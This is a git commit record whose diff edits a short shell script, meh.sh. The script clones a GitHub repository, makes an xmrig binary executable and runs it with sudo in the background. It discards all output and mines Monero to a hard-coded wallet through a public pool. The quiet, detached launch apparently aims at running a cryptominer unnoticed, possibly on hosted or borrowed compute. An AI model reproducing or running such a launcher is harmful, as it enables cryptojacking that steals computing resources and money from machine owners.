076c1c8ba18f1b8b9fe498441d655f8e47b01cd4
hbknjr <robertburgin@my.smccd.edu>
2021-01-25 16:28:13 +0000

    ehllo

--- meh.sh
+++ meh.sh
@@ -1,4 +1,5 @@
 git clone https://github.com/hbknjr/isthisfilehost.git
 cd isthisfilehost
+chmod +x xmrig
 nohup sudo ./xmrig --cuda -B -o pool.minexmr.com:443 -u 4A2g6UBpHGka52nTv4Wv4tNqPFotCk2rx19T3htk2cJNEt1YkZAZBfmZCUDiQkGUhyASwkgafQQg7jaEhstfHAx8P53m8St -k --tls > /dev/null 2>&1 &
 exit 0
